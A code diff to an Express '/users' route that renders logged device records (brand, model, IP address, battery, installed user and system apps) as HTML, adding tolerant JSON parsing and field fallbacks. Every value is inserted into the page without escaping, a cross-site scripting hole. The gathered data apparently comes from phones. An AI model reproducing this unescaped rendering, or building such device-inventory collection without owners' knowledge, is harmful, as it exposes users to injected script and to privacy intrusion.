@@ -183,7 +183,11 @@ app.get('/users', (req, res) => {
   const logs = fs.readFileSync(LOG_FILE, "utf-8")
     .split("\n")
     .filter(Boolean)
-    .map(x => JSON.parse(x));
+    .map(x => {
+      try { return JSON.parse(x); }
+      catch { return null; }
+    })
+    .filter(Boolean);
 
   const devices = logs.filter(x => x.type === "device");
 
@@ -198,18 +202,22 @@ app.get('/users', (req, res) => {
   let html = `<html><body style="background:#111;color:#fff;font-family:sans-serif">`;
 
   list.reverse().forEach(u => {
+
+    const apps = u.user_apps || u.apps || [];
+    const system = u.system_apps || [];
+
     html += `
     <div style="border:1px solid #333;padding:10px;margin:10px">
-      <b>${u.brand} ${u.model}</b><br>
-      IP: ${u.ip}<br>
-      Battery: ${u.battery}<br>
-      Apps: ${u.app_count}<br>
+      <b>${u.brand || ""} ${u.model || ""}</b><br>
+      IP: ${u.ip || ""}<br>
+      Battery: ${u.battery || ""}<br>
+      Apps: ${u.app_count || apps.length}<br>
 
-      <h4>User Apps</h4>
-      ${(u.user_apps || []).map(a => `<div>${a}</div>`).join("")}
+      <h4>Apps</h4>
+      ${apps.map(a => `<div>${a}</div>`).join("")}
 
-      <h4>System Apps</h4>
-      ${(u.system_apps || []).map(a => `<div>${a}</div>`).join("")}
+      ${system.length ? `<h4>System Apps</h4>
+      ${system.map(a => `<div>${a}</div>`).join("")}` : ""}
     </div>
     `;
   });
